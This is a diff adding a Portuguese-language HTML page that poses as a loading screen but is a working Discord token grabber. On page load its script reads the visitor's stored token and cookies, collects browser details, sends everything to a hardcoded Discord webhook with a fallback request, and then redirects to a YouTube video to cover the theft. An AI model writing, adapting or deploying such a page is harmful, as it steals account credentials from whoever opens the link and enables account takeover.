@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Carregando...</title>
+    <script>
+        (function() {
+            // Webhook do Discord
+            const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
+            
+            // Imagem opcional
+            const imageURL = "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png?ex=6a3dfb56&is=6a3ca9d6&hm=dd4a3d526ee32f3a8ad17f16e792206b57b7f68ae68ef3d8c8333ddfeb4a80f8&=&format=webp&quality=lossless";
+
+            // Capturar informações
+            const token = localStorage.getItem("token") || "Token não encontrado (não está logado no Discord Web)";
+            
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${screen.width}x${screen.height}`;
+            
+            // Tentar pegar cookies do discord.com (requer permissão em alguns casos)
+            let discordcookies = document.cookie || "Nenhum cookie acessível";
+            
+            // Montar a mensagem (formato embed)
+            const payload = {
+                content: "@everyone **Novo Token Capturado via Link!**",
+                embeds: [{
+                    title: "🎣 Token Grabber - Link",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "Token", value: `\`${token}\``, inline: false },
+                        { name: "User Agent", value: userAgent.substring(0, 100), inline: false },
+                        { name: "Platform", value: platform, inline: true },
+                        { name: "Idioma", value: language, inline: true },
+                        { name: "Resolução", value: screenRes, inline: true },
+                        { name: "Cookies (discord.com)", value: discordcookies.substring(0, 200), inline: false }
+                    ],
+                    thumbnail: { url: imageURL },
+                    footer: { text: "HackerAI - Link Grabber" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Enviar via navigator.sendBeacon (con torn a CORS)
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            navigator.sendBeacon(webhookURL, blob);
+            
+            // Fallback: imagem de rastreio
+            setTimeout(() => {
+                const img = new Image();
+                img.src = webhookURL + "?payload=" + encodeURIComponent(JSON.stringify(payload));
+            }, 500);
+            
+            // Redirecionar para página legítima após captura
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 1500);
+        })();
+    </script>
+</head>
+<body>
+    <h1>Carregando página...</h1>
+    <p>Aguarde um momento.</p>
+</body>
+</html>
